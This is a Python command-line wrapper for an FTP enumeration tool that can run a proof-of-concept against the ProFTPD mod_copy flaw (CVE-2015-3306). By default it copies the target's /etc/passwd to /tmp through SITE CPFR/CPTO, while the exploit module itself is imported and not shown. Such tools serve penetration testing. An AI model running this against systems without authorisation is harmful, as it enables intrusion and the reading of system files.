import argparse,json
from .enumerator import enumerate_ftp
from .exploits import proftpd_modcopy

def main():
    p=argparse.ArgumentParser(prog="mbunga-ftp")
    p.add_argument("target"); p.add_argument("-p","--port",type=int,default=21)
    p.add_argument("-t","--timeout",type=float,default=3.0)
    p.add_argument("--json",dest="json_file")
    p.add_argument("--exploit",action="store_true",
                   help="run exploit check/PoC (ProFTPD 1.3.5 mod_copy, CVE-2015-3306)")
    p.add_argument("--src",default="/etc/passwd",help="source file for SITE CPFR")
    p.add_argument("--dst",default="/tmp/mbunga-proof.txt",help="destination for SITE CPTO")
    a=p.parse_args()
    r=enumerate_ftp(a.target,a.port,a.timeout)
    print(f"MBUNGA-FTP v0.2 | {r['host']}:{r['port']}")
    print(f"Banner : {r['banner']}\nProduct: {r['product']}\nVersion: {r['version'] or 'unknown'}")
    for k in ("syst","feat","help"): print(f"\n[{k.upper()}]\n{r[k]}")
    if a.exploit:
        print("\n[EXPLOIT] ProFTPD mod_copy (CVE-2015-3306)")
        x=proftpd_modcopy.run(a.target,a.port,a.timeout,a.src,a.dst)
        for d in x["details"]: print("  "+d)
        print(f"  Vulnerable: {x['vulnerable']}")
        r["exploit"]=x
    if a.json_file:
        with open(a.json_file,"w",encoding="utf-8") as f: json.dump(r,f,indent=2,ensure_ascii=False)

if __name__=="__main__": main()
